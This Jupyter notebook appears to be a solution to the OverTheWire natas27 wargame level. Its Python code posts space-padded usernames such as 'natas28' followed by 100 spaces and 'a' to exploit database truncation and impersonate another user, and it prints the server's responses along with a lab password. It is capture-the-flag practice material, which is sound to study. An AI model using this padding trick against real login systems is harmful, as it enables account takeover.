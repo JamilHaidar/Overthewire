{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas27\", \"pass\": \"u3RRffXjysjgwFU6b9xa23i6prmUsYne\" };</script></head>\n",
      "<body>\n",
      "<h1>natas27</h1>\n",
      "<div id=\"content\">\n",
      "User natas28                                                                                                    a was created!<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas27\", \"pass\": \"u3RRffXjysjgwFU6b9xa23i6prmUsYne\" };</script></head>\n",
      "<body>\n",
      "<h1>natas27</h1>\n",
      "<div id=\"content\">\n",
      "Wrong password for user: natas28<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from requests.auth import HTTPBasicAuth\n",
    "session = requests.Session()\n",
    "session.auth = ('natas27','u3RRffXjysjgwFU6b9xa23i6prmUsYne')\n",
    "url = 'http://natas27.natas.labs.overthewire.org'\n",
    "r = session.get(url)\n",
    "cookie = dict()\n",
    "data = {'username':'natas28'+' '*100+'a','password':'123'}\n",
    "r = session.post(url,data=data,cookies=cookie)\n",
    "print(r.text)\n",
    "data = {'username':'natas28'+' '*57,'password':'123'}\n",
    "r = session.post(url,data=data,cookies=cookie)\n",
    "print(r.text)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
